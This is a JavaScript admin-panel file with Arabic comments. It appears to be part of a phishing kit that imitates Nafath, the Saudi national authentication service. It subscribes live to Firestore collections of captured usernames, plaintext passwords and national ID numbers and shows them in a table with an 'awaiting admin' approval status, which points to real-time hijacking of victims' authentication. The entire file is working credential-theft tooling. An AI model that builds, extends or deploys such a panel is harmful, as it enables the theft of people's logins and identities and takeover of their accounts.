// admin.js
import { db } from "./firebase-config.js";
import { 
    collection, 
    query, 
    orderBy, 
    onSnapshot 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    const logsTableBody = document.getElementById('logsTableBody');

    // كائنات لتخزين البيانات المستلمة مؤقتاً لتسهيل الدمج والترتيب
    let allLogs = {};

    // دالة لتحديث واجهة الجدول بعد دمج البيانات وترتيبها
    function renderTable() {
        logsTableBody.innerHTML = "";

        // تحويل الكائن المدمج إلى مصفوفة وترتيبها من الأحدث للأقدم
        const sortedLogs = Object.values(allLogs).sort((a, b) => {
            const timeA = a.timestamp ? a.timestamp.toMillis() : 0;
            const timeB = b.timestamp ? b.timestamp.toMillis() : 0;
            return timeB - timeA; // ترتيب تنازلي (الأحدث فوق)
        });

        if (sortedLogs.length === 0) {
            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد طلبات مستلمة حالياً...</td></tr>`;
            return;
        }

        sortedLogs.forEach((log) => {
            let formattedTime = "غير محدد";
            if (log.timestamp) {
                formattedTime = log.timestamp.toDate().toLocaleString('ar-EG', { hour12: true });
            }

            let statusClass = log.status === "approved" ? "approved" : "waiting";
            let statusText = log.status === "approved" ? "تم القبول" : "بانتظار الأدمن";

            const row = document.createElement('tr');
            
            if (log.type === "app_request") {
                // عرض بيانات نموذج تطبيق نفاذ (nationalId)
                row.innerHTML = `
                    <td><span class="type-badge type-app">تطبيق نفاذ</span></td>
                    <td><strong>${log.nationalId || '---'}</strong></td>
                    <td style="color: #95a5a6; font-style: italic;">(طلب مصادقة تطبيق)</td>
                    <td>${formattedTime}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                `;
            } else {
                // عرض بيانات نموذج اسم المستخدم وكلمة المرور
                row.innerHTML = `
                    <td><span class="type-badge type-pass">اسم مستخدم</span></td>
                    <td><strong>${log.username || '---'}</strong></td>
                    <td style="color: #c0392b; font-family: monospace;">${log.password || '---'}</td>
                    <td>${formattedTime}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                `;
            }
            logsTableBody.appendChild(row);
        });
    }

    // 1. الاستماع اللحظي لمجموعة اسم المستخدم وكلمة المرور
    const qUsers = query(collection(db, "users_login"));
    onSnapshot(qUsers, (snapshot) => {
        snapshot.forEach((doc) => {
            allLogs[doc.id] = { id: doc.id, type: "user_login", ...doc.data() };
        });
        renderTable();
    });

    // 2. الاستماع اللحظي لمجموعة تطبيق نفاذ (nationalId / status / timestamp)
    const qNafath = query(collection(db, "nafath_app_requests"));
    onSnapshot(qNafath, (snapshot) => {
        snapshot.forEach((doc) => {
            allLogs[doc.id] = { id: doc.id, type: "app_request", ...doc.data() };
        });
        renderTable();
    });
});
